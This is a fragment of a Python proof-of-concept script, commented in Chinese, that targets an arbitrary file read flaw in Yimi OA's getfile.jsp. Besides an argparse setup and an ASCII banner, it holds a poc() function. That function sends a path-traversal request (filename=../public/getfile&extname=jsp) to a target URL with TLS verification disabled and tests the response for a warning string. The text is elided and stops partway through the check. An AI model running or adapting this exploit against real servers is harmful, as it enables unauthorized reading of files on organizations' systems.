...
def main():
    '''主函数'''
    banner()            
    parser = argparse.ArgumentParser(description = '一米OA getfile.jsp 任意文件读取漏洞')    #实例化对象
...
| $$  | $$| $$  | $$      | $$  | $$| $$_____/  | $$ /$$| $$      | $$| $$| $$_____/    | $$ \____  $$| $$  | $$      
|  $$$$$$/| $$  | $$      |  $$$$$$$|  $$$$$$$  |  $$$$/| $$      | $$| $$|  $$$$$$$ /$$| $$ /$$$$$$$/| $$$$$$$/      
 \______/ |__/  |__/       \____  $$ \_______/   \___/  |__/      |__/|__/ \_______/|__/| $$|_______/ | $$____/       
                           /$$  \ $$                                               /$$  | $$          | $$            
                          |  $$$$$$/                                              |  $$$$$$/          | $$            
                           \______/                                                \______/           |__/            
...
def poc(target):
    '''检测漏洞'''
    url = target + '/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp '
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    }
    try:
        result = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if '警告非法用户，你无访问此页的权限！' in result:
